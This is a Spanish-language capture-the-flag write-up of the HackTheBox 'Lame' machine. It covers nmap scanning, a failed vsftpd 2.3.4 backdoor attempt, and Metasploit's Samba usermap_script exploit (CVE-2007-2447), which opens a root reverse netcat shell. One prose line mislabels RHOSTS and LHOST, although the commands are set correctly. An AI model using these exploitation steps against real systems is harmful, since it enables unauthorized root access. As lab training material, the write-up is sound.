# Maquina Lame - HackTheBox

* Nivel : Easy
* Máquina : Linux
* 2 Flags (No estan en este .md)
* Útil para el Ejptv2
* Ip Maquina : 10.10.10.3 (En mi caso)

## Escaneo de puertos

```bash
sudo nmap -A -O -T4 -p- -Pn 10.10.10.3
```
```
Nmap scan report for 10.10.10.3
Host is up (0.12s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.95
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (90%), Control4 HC-300 home controller (90%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (90%), Dell Integrated Remote Access Controller (iDRAC5) (90%), Dell Integrated Remote Access Controller (iDRAC6) (90%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.7 (90%), Citrix XenServer 5.5 (Linux 2.6.18) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-06-15T05:54:10-04:00
|_clock-skew: mean: 2h00m31s, deviation: 2h49m45s, median: 29s
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   137.42 ms 10.10.14.1
2   140.72 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 298.68 seconds
```

### Task 1
How many of the nmap top 1000 TCP ports are open on the remote host? 4 

### Task 2
What version of VSFTPd is running on Lame? 2.3.4

## Búsqueda de Vulnerabilidades

He útilizado searchsploit para buscar la existencia de exploits en la versión vsftpd 2.3.4 del ftp.

```bash
searchsploit vsftpd
```

```
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                        | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                        | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                        | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                      | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                             | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                               | multiple/remote/49719.py
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
En nuestro metasploit hay una exploit para la versión vsftpd 2.3.4. Entonces hay que mirar que hace ese archivo .py .

```
searchsploit 49757 -x
```
Ahora traer el archivo a nuestra ruta actual. Cuando pregunte Yes.
```bash
searchsploit 49757 -m .
```
Ejecutar el py.
```
python3 49757.py

/home/kali/Downloads/49757.py:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  from telnetlib import Telnet
usage: 49757.py [-h] host
49757.py: error: the following arguments are required: host
```
Me da el error por que no he puesto el host.
```
python3 49757.py 10.10.10.3
/home/kali/Downloads/49757.py:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  from telnetlib import Telnet
```
Al final da un mensaje de error, ya que no funciona en esta mquina.

### Task 3 
* There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?  NO
### Task 4
* What version of Samba is running on Lame? Give the numbers up to but not including "-Debian". :   3.0.20

- Buscar por el buscador, el CVE de samba 3.0.20.
### Task 5 

What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the SamrChangePassword function when the "username map script" option is enabled in smb.conf? : CVE-2007-2447

## Explotación de vulnerabilidad con Metasploit

Para abrir metasploit : 

```bash
msfconsole
```
Cuando se despliege, utilizar el search:
```
search samba 3.0.20
```
Nos da un posible exploit.
```
Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

```
Usar el exploit, que al no configurar un payload ya nos da uno predeterminado.
```
use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
```
Mirar los parametros que necesita
```
msf6 exploit(multi/samba/usermap_script) > show options

```
```
Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                       s/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
Configurar, RHOSTS la ip de nuestra maquina atacante y el LHOST ip maquina victima.
```
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
```
```
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.95
LHOST => 10.10.14.95

```
Una vez configurado ejecutar el exploit.
```
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 10.10.14.95:4444 
[*] Command shell session 1 opened (10.10.14.95:4444 -> 10.10.10.3:55468) at 2025-06-15 06:33:34 -0400
```
Hacer un whoami y ya seremos root. Al ser root podemos hacer un find para encontrar las flags y luego un cat: 
```
find / -name user.txt
```
```
find / -name root.txt
```
